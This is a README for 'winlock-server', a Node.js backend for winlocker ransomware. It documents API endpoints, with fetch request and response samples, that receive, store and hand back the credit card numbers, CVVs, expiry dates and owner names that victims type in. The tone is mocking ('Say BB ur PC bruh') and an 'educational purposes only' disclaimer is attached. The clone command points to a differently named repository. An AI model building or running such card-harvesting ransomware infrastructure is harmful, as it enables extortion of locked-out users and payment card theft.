<br>
<h1 align="center">winlock-server</h1>
<div align="center">
  
<br>

[![Badge](https://img.shields.io/badge/Uses-Node.js-green.svg?style=flat-square)](1)
[![Badge](https://img.shields.io/badge/Open-Source-important.svg?style=flat-square)](1)
[![Badge](https://img.shields.io/badge/Made_with-Love-ff69b4.svg?style=flat-square)](1)
    
<br>

</div>

## Installation:
-   Install [Node.js](https://nodejs.org/en/),
-   Clone this repo: `git clone https://github.com/Ythosa/whynote`,
-   Install dependences by writing in console: `npm install`,
-   Write in console: `npm start`.

<br>

## Description:
-    Opensource Server on `Node.js` for Winlock Development Practice;
-    Designed for educational purposes only, the author is not responsible for how you use it;
-    The `winlock-server` can:
     *  check the card data entered by the user;
     *  save card data entered by the user;    
     *  return card data entered by the user.

<br>


## Using Example (or just funny gif):
<div align="center">
	<img src = "https://github.com/Ythosa/winlock-server/blob/master/_res/anigi1f.gif">
</div>

## Documentation: 

### Http request to check the map and save it to the database:

~-~ Request sample:

``` javascript
var raw = JSON.stringify({
  "digits":"4111111111111111",
  "cvv":"111",
  "date":"M/YY",
  "owner":"Sername Name"
});

var requestOptions = {
  method: 'POST',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
};

fetch("http://localhost:3000/card", requestOptions)
  .then(response => response.text())
  .then(result => console.log(result))
  .catch(error => console.log('error', error));
  
  ```
  
~-~ Response sample: 

```json
{
    "ok": true,
    "message": "Successful! Download our winlocker again!"
}
```

### Http request to get cards from BD:

~-~ Request sample:

```javascript 
var raw = JSON.stringify({"token":"hacker_from_anonymous"});

var requestOptions = {
  method: 'POST',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
};

fetch("http://localhost:3000/get_cards", requestOptions)
  .then(response => response.text())
  .then(result => console.log(result))
  .catch(error => console.log('error', error));
```

~-~ Response sample:

```json
[
    {
        "digits": "4111111111111111",
        "cvv": "111",
        "date": "M/YY",
        "owner": "SERNAME NAME",
        "card_details_error": null
    }
]
```

### Http request to get server information:

~-~ Request sample:

```javascript
var requestOptions = {
  method: 'GET',
  redirect: 'follow'
};

fetch("http://localhost:3000/", requestOptions)
  .then(response => response.text())
  .then(result => console.log(result))
  .catch(error => console.log('error', error));
```

~-~ Response sample:

```html
<!DOCTYPE html>
<html>

	<head>
		<title>winlock</title>
		<link rel="stylesheet" href="/stylesheets/style.css">
	</head>

	<body>
		<h1>WinLock API Server</h1>
		<p>Say BB ur PC bruh xd</p>
	</body>

</html>
```
